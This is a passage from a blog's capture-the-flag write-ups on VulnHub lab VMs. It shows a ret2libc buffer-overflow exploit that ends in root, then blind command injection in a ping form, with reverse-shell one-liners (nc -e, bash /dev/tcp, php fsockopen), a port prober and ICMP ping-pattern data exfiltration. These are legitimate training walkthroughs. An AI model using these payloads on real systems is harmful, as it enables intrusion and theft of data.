</span></code></pre></td></tr></table></div></figure>


<p>So <code>system()</code> lives at <code>0xb7e6b060</code>. We are going to point EIP here and provide it a argument from a environment variable. I don&rsquo;t really care if the application exits cleanly, however you can easily get that right by leaking the location of <code>exit()</code> too and placing that as the ret address in the exploit. I just like to type JUNK ;)</p>

<p>So far our exploit payload will look something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>A * 268 + system() + JUNK
</span></code></pre></td></tr></table></div></figure>


<p>The last thing we need is a argument for <code>system()</code> on the stack so that it can execute that. One way of achieving this is to provide the memory location of a string such as <code>/bin/sh</code>. We can easily set an environment variable with this string, locate it in memory and use that.</p>

<p>So lets create this string, which we will refer to as the EGG.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">EGG</span><span class="o">=</span>/bin/sh
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>env <span class="p">|</span> grep EGG
</span><span class='line'><span class="nv">EGG</span><span class="o">=</span>/bin/sh
</span></code></pre></td></tr></table></div></figure>


<p>Next, we can use a small C program to tell us where this EGG is in memory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>cat /tmp/findegg.c
</span><span class='line'><span class="c">#include &lt;unistd.h&gt;</span>
</span><span class='line'>
</span><span class='line'>int main<span class="o">(</span>void<span class="o">)</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>  <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;EGG address: 0x%lx\n&quot;</span>, getenv<span class="o">(</span><span class="s2">&quot;EGG&quot;</span><span class="o">)</span>+4<span class="o">)</span><span class="p">;</span>
</span><span class='line'>  <span class="k">return </span>0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>gcc /tmp/findegg.c -o /tmp/findegg
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>/tmp/findegg
</span><span class='line'>EGG address: 0xbfffff04
</span></code></pre></td></tr></table></div></figure>


<p>So our egg lives at <code>0xbfffff04</code>. This memory address will probably be different for you if you try, but the process to find it remains the same. We also have to keep in mind that the environment will be slightly different when we execute our exploit in and out of <code>gdb</code>.</p>

<p>With everything we need, we can deduce that our exploit payload will end up being something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>A * 268 + system() + JUNK + EGG
</span></code></pre></td></tr></table></div></figure>


<p>Lets get the python version of that written up and sent to our vulnerable binary (addresses are written &lsquo;backwards&rsquo; due to the little endian format of the CPU):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x04\xff\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>Wups, segfault. You will find that this is probably because the location of our EGG in memory did not compensate for the length of the binary name. Our binary is called <code>r00t</code>, which is 4 chars long, so maybe we need to move the location of our EGG up with up to 4 bytes. For demonstration purposes I am going to show all the attempts for each byte:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># so just to recap, we check for the location of the EGG</span>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./findegg
</span><span class='line'>EGG address: 0xbfffff04
</span><span class='line'>
</span><span class='line'><span class="c"># EGG is at 0xbfffff04, so in little endian format we have:</span>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x04\xff\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>Segmentation fault
</span><span class='line'>
</span><span class='line'><span class="c"># A segfault, lets move it up 1 byte</span>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x05\xff\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>sh: 1: <span class="o">=</span>/bin/sh: not found
</span><span class='line'>Segmentation fault
</span><span class='line'>
</span><span class='line'><span class="c"># another segfault, however we have a little diagnostics message now</span>
</span><span class='line'><span class="c"># showing that we are not far off :)</span>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x06\xff\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<h2>trollin the rootin</h2>

<p>So <code>0xbfffff06</code> as a EGG location will give us shell in our testing! To finish off then, I have to find the correct <code>r00t</code> binary in all of the <code>door{1,2,3}</code> folders and attempt my exploit there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\x06\xff\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>sh: 1: in:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games: not found
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>Another segmentation fault! This time we seem to be waaaaaaaay off too. This is because of the <code>PWD</code> changing so drastically. To fix this, we simply rerun our <code>findegg</code> program and compensate for the binary name. When completing this, I had a successful run as follows:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;\x60\xb0\xe6\xb7&quot; + &quot;JUNK&quot; + &quot;\xe2\xfe\xff\xbf&quot;&#39;</span><span class="k">)</span>
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1002<span class="o">(</span>noob<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This time I had to move the memory location for for my EGG on by quite a few bytes, in fact from <code>0xbffffeda</code> all the way to <code>0xbffffee2</code></p>

<p>As I was now root, I may cat the <code>Proof.txt</code> in <code>/root</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># cat /root/Proof.txt</span>
</span><span class='line'>You win this <span class="nb">time </span>young Jedi...
</span><span class='line'>
</span><span class='line'>a70354f0258dcc00292c72aab3c8b1e4
</span></code></pre></td></tr></table></div></figure>


<p>Thanks <a href="https://twitter.com/Maleus21">@Maleus21</a> for the fun VM and <a href="http://vulnhub.com/">VulnHub</a> for the hosting :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[From Persistence, to pain, to PWN]]></title>
    <link href="http://leonjza.github.io/blog/2014/09/18/from-persistence/"/>
    <updated>2014-09-18T06:58:53+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/09/18/from-persistence</id>
    <content type="html"><![CDATA[<h2>persist we must!</h2>

<p>Persistence! A new boot2root hosted <a href="https://twitter.com/vulnhub">@VulnHub</a>, authored by <a href="https://twitter.com/superkojiman">@superkojiman</a> and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a <a href="http://blog.vulnhub.com/2014/09/competition-persistence.html">writeup competition</a> launched on September the 7th, and ran up until October th 5th.</p>

<blockquote><p>Energy and persistence conquer all things.</p><footer><strong>Benjamin Franklin</strong></footer></blockquote>


<p>This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &ldquo;meh, next&rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!</p>

<!--more-->


<h2>lets get our hands dirty</h2>

<p>As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.</p>

<p>My VM got the IP 192.168.56.104, and the first Nmap result was:</p>

<figure class='code'><figcaption><span>First Persistence Nmap</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap 192.168.56.104 --reason -sV -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-09-18 07:01 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.104
</span><span class='line'>Host is up, received reset <span class="o">(</span>0.0037s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 65534 filtered ports
</span><span class='line'>Reason: 65534 no-responses
</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
</span><span class='line'>80/tcp open  http    syn-ack nginx 1.4.7
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 4131.90 seconds
</span></code></pre></td></tr></table></div></figure>


<p>Not exactly much to work with, but its something at least! We know now that according to the web server banners, we are facing nginx. A welcome change to the usual apache stuff we see! A quick and nasty Google for nginx 1.4.7 exploits also did not return with any really interesting results. Not a problem really.</p>

<p>Browsing to the site did not reveal anything interesting. A creepy image of melting clocks (what&hellip;) with the page sources serving it being minimal and uninteresting too. Manually poking about the web paths (for things like robots.txt etc) also did not reveal anything. The first hint however came when I fiddled with the index page location.</p>

<p>By default, most web servers will serve the default index page when no location is specified from the web root. So, I tried <code>index.html</code>, and got the normal landing. When I requested <code>index.php</code> though, things changed drastically:</p>

<figure class='code'><figcaption><span>PHP reveal</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -v 192.168.56.104/index.php
</span><span class='line'>* About to connect<span class="o">()</span> to 192.168.56.104 port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>*   Trying 192.168.56.104...
</span><span class='line'>* connected
</span><span class='line'>* Connected to 192.168.56.104 <span class="o">(</span>192.168.56.104<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET /index.php HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: 192.168.56.104
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>
</span><span class='line'>* additional stuff not fine transfer.c:1037: 0 0
</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'>&lt; HTTP/1.1 404 Not Found
</span><span class='line'>&lt; Server: nginx/1.4.7
</span><span class='line'>&lt; Date: Thu, 18 Sep 2014 07:28:18 GMT
</span><span class='line'>&lt; Content-Type: text/html
</span><span class='line'>&lt; Transfer-Encoding: chunked
</span><span class='line'>&lt; Connection: keep-alive
</span><span class='line'>&lt; X-Powered-By: PHP/5.3.3
</span><span class='line'>
</span><span class='line'>No input file specified.
</span><span class='line'>
</span><span class='line'>* Connection <span class="c">#0 to host 192.168.56.104 left intact</span>
</span><span class='line'>* Closing connection <span class="c">#0</span>
</span></code></pre></td></tr></table></div></figure>


<p>As can be seen in the output above, the header <code>X-Powered-By: PHP/5.3.3</code> is now present, and the output <code>No input file specified.</code>. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.</p>

<h2>finding that (de)bugger</h2>

<p>With this information now gathered, it was time to pull out one of my favorite tools, <code>wfuzz</code>! With <code>wfuzz</code>, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.</p>

<p>My first attempt to search for web paths failed pretty badly. All of the requests responded with a 404. Luckily I was aware of the PHP capabilities, so I set to find arbritary PHP scripts by appending <em>.php</em> to my <code>FUZZ</code> keyword:</p>

<figure class='code'><figcaption><span>discovering debug.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt --hc 404 http://192.168.56.104/FUZZ.php
</span><span class='line'>
</span><span class='line'>********************************************************
</span><span class='line'>* Wfuzz  2.0 - The Web Bruteforcer                     *
</span><span class='line'>********************************************************
</span><span class='line'>
</span><span class='line'>Target: http://192.168.56.104/FUZZ.php
</span><span class='line'>Payload <span class="nb">type</span>: file,/usr/share/wordlists/wfuzz/general/medium.txt
</span><span class='line'>
</span><span class='line'>Total requests: <span class="nv">1660</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>ID  Response   Lines      Word         Chars          <span class="nv">Request</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>
</span><span class='line'>00434:  <span class="nv">C</span><span class="o">=</span>200     12 L        28 W      357 Ch    <span class="s2">&quot; - debug&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yay. <code>wfuzz</code> is stupidly fast and finished the above in like 4 seconds. Browsing to <a href="http://192.168.56.101/debug.php">http://192.168.56.101/debug.php</a> showed us a input field labeled &ldquo;Ping address:&rdquo; and a submit button</p>

<p><img src="https://i.imgur.com/neKe18e.png"></p>

<p>&ldquo;Command injection?&rdquo;, was the first thought here.</p>

<h2>blind command injection</h2>

<p>I started by entering a valid IP address that had <code>tcpdump</code> listening to test if the script is actually running a ping like it says &hellip;</p>

<figure class='code'><figcaption><span>ping test</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# tcpdump icmp
</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv <span class="k">for </span>full protocol decode
</span><span class='line'>listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 65535 bytes
</span><span class='line'>07:46:15.503023 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 1, length 64
</span><span class='line'>07:46:15.503040 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 1, length 64
</span><span class='line'>07:46:16.503729 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 2, length 64
</span><span class='line'>07:46:16.503768 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 2, length 64
</span><span class='line'>07:46:17.503180 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 3, length 64
</span><span class='line'>07:46:17.503260 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 3, length 64
</span><span class='line'>07:46:18.502811 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 64004, seq 4, length 64
</span><span class='line'>07:46:18.502842 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 64004, seq 4, length 64
</span></code></pre></td></tr></table></div></figure>


<p>&hellip; which it was. What is important to note here is that we have 4 echo requests.</p>

<p>I then proceeded to modify the input attempting to execute other commands too. None of my attempts returned any output to the browser, however, sending the field <code>;exit 0;</code> caused the HTTP request to complete almost instantly while no ping requests were observed on the <code>tcpdump</code>. This had me certain that this field was vulnerable to a command injection vulnerability.</p>

<p>This is all good, but not getting any output makes it really had to work with this. So, the next steps were to try and get a reverse/bind shell out of this command injection vulnerability.</p>

<p>I tried the usual culprits: <code>nc &lt;ip&gt;  &lt;port&gt; -e /bin/bash</code>; <code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code>; <code>php -r '$sock=fsockopen("&lt;ip&gt;",&lt;port&gt;);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code>. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?</p>

<h2>blind command injection &ndash; file enumeration</h2>

<p>Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.</p>

<p>I thought I should try and see if I can confirm the existence of files. To do this, I used a simple bash <code>if [ -f /file ]</code> statement, with a single ping for success, and 2 pings for a failure. The string for the <code>debug.php</code> input field looked something like this:</p>

<figure class='code'><figcaption><span>File existence check payload</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;</span><span class="k">if</span> <span class="o">[</span> -f /bin/sh <span class="o">]</span> <span class="p">;</span> <span class="k">then </span>ping 192.168.56.102 -c 1 <span class="p">;</span> <span class="k">else </span>ping 192.168.56.102 -c 2 <span class="p">;</span> <span class="k">fi</span>
</span></code></pre></td></tr></table></div></figure>


<p>Submitting the above input presented me with a single ping, confirming that <code>/bin/sh</code> exists.</p>

<figure class='code'><figcaption><span>File existence response</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# tcpdump icmp
</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv <span class="k">for </span>full protocol decode
</span><span class='line'>listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 65535 bytes
</span><span class='line'>08:15:53.557994 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 63493, seq 1, length 64
</span><span class='line'>08:15:53.558011 IP 192.168.56.102 &gt; 192.168.56.104: ICMP <span class="nb">echo </span>reply, id 63493, seq 1, length 64
</span></code></pre></td></tr></table></div></figure>


<p>Checking for something like <code>/bin/sh2</code> responded with 2 pings, as expected. Awesome. I can now enumerate the existence of files. The concept itself is probably pretty useless, however, if I can confirm the existence of something useful, such as <code>/bin/nc</code>, I may end up with greater success of a shell!</p>

<p>I continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless,  <code>/usr/bin/python</code> appeared to be available! I really like python so this had me really happy.</p>

<h2>blind command injection &ndash; port scanner</h2>

<p>I tested a few commands with <code>python -c</code>, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.</p>

<p>No. Luck.</p>

<p>I no longer doubted the fact that I had a working interpreter, however, the question about a egress firewall still remains unanswered. To test this, I decided to code a small, cheap-and-nasty port &lsquo;prober&rsquo; so that I can try and determine which port is open outgoing. The idea was to watch my <code>tcpdump</code> for any tcp traffic comming from this host:</p>

<figure class='code'><figcaption><span>probe.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">65535</span><span class="p">):</span>
</span><span class='line'>    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="s">&quot;192.168.56.102&quot;</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Using my blind command injection, I echoed this content to <code>/tmp/probe.py</code> via the input field, and then in a subsequent request, ran it using <code>python /tmp/probe.py</code>. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open&hellip;</p>

<h2>data exfiltration</h2>

<p>With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the <code>debug.php</code> file on disk and tried to echo a PHP web shell to the same directory. This also failed.</p>

<p>So, only ping eh. I recall something about ping tunnels/ping shells/ping something. So, I googled some of these solutions. There were a number of things I could try, however, I was wondering how the actual data transport was happening for these things.</p>

<p>Eventually, I came across the <code>-p</code> argument for ping after reading <a href="http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html">this</a> blogpost. From <code>man 8 ping</code> we read:</p>

<figure class='code'><figcaption><span>ping patterns</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-p pattern
</span><span class='line'>   You may specify up to 16 <span class="sb">``</span>pad<span class="s1">&#39;&#39;</span> bytes to fill out the packet you send.
</span><span class='line'>   This is useful <span class="k">for </span>diagnosing data-dependent problems in a network.
</span><span class='line'>   For example, <span class="sb">``</span>-p ff<span class="s1">&#39;&#39;</span> will cause the sent packet to be filled with all ones.
</span></code></pre></td></tr></table></div></figure>


<p>So that changes things. I quickly confirmed that we have <code>xxd</code> available using my previous enumeration method and we did. Great.</p>

<p>I fired up tcpdump with the <code>-X</code> flag to show me the packet contents, and tested it out with the following payload for the <code>id</code> command:</p>

<figure class='code'><figcaption><span>Ping pattern `id` command</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;</span>id<span class="p">|</span> xxd -p -c 16 <span class="p">|</span> <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span>ping -p <span class="nv">$line</span> -c 1 -q 192.168.56.102<span class="p">;</span> <span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>


<p>On the <code>tcpdump</code> side of things&hellip;</p>

<figure class='code'><figcaption><span>Ping pattern tcpdump</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop# tcpdump icmp -X
</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv <span class="k">for </span>full protocol decode
</span><span class='line'>listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size 65535 bytes
</span><span class='line'>09:18:14.439222 IP 192.168.56.104 &gt; 192.168.56.102: ICMP <span class="nb">echo </span>request, id 6920, seq 1, length 64
</span><span class='line'>    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
</span><span class='line'>    0x0010:  c0a8 3866 0800 4b5b 1b08 0001 56a3 1a54  ..8f..K<span class="o">[</span>....V..T
</span><span class='line'>    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx<span class="o">)</span>.guid<span class="o">=</span>
